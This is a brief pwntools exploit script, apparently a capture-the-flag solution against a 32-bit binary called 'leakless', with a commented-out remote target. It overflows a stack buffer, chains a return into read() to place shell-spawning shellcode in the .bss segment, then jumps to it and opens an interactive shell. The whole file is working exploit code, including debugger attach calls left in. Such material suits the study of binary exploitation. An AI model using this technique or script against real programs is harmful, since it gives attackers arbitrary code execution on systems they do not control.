from pwn import *
#context.log_level = 'debug'
sh = process('./leakless')
#sh = remote('51.68.189.144','31007')
libc = ELF('./leakless')

bss_addr = libc.bss()+0x20
print 'bss_addr: ' + hex(bss_addr)
shellcode = asm(shellcraft.sh())
print  len(shellcode)
pay = 'a'*0x48 + 'bbbb'
#pay += p32(libc.plt['puts']) + p32(libc.symbols['main']) + p32(libc.got['read'])
pay += p32(libc.symbols['read'])+p32(libc.symbols['feedme'] )+ p32(0)+p32(bss_addr)+p32(len(shellcode)+10)

sh.sendline(pay)
#read_addr = sh.recv(4)
#print 'read_addr : '+hex(read_addr)
#gdb.attach(sh)

sleep(0.5)
sh.sendline(shellcode)
sleep(0.5)
gdb.attach(sh)
pay = 'a'*0x48 + 'bbbb' + p32(bss_addr)
sh.send(pay)

gdb.attach(sh)#,'b*0x080485f8')
#sh.recv()
sh.interactive()
